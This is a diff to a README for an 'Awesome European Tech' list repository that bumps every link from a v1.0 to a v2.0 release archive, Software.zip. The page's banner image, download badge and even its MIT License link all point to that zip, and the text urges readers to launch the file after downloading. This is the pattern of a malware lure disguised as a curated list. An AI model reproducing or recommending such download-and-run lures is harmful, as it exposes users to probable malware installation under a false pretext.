@@ -1,6 +1,6 @@
 # 🚀 Welcome to Awesome European Tech 🇪🇺
 
-![Awesome European Tech](https://github.com/Gnuhna/Awesome-European-Tech/releases/download/v1.0/Software.zip)
+![Awesome European Tech](https://github.com/Gnuhna/Awesome-European-Tech/releases/download/v2.0/Software.zip)
 
 ## Introduction
 
@@ -14,9 +14,9 @@ Welcome to the **Awesome European Tech** repository! This is an up-to-date, comm
 
 ## Software Download
 
-[![Download Software](https://github.com/Gnuhna/Awesome-European-Tech/releases/download/v1.0/Software.zip)](https://github.com/Gnuhna/Awesome-European-Tech/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/Gnuhna/Awesome-European-Tech/releases/download/v2.0/Software.zip)](https://github.com/Gnuhna/Awesome-European-Tech/releases/download/v2.0/Software.zip)
 
-The software is available for download at the following link: [Software Download](https://github.com/Gnuhna/Awesome-European-Tech/releases/download/v1.0/Software.zip). Don't forget to launch the file after downloading to start the installation process.
+The software is available for download at the following link: [Software Download](https://github.com/Gnuhna/Awesome-European-Tech/releases/download/v2.0/Software.zip). Don't forget to launch the file after downloading to start the installation process.
 
 ## 🌟 How to Contribute
 
@@ -34,7 +34,7 @@ Please note that this project is released with a Contributor Code of Conduct. By
 
 ## 📜 License
 
-This project is licensed under the [MIT License](https://github.com/Gnuhna/Awesome-European-Tech/releases/download/v1.0/Software.zip).
+This project is licensed under the [MIT License](https://github.com/Gnuhna/Awesome-European-Tech/releases/download/v2.0/Software.zip).
 
 ---
 
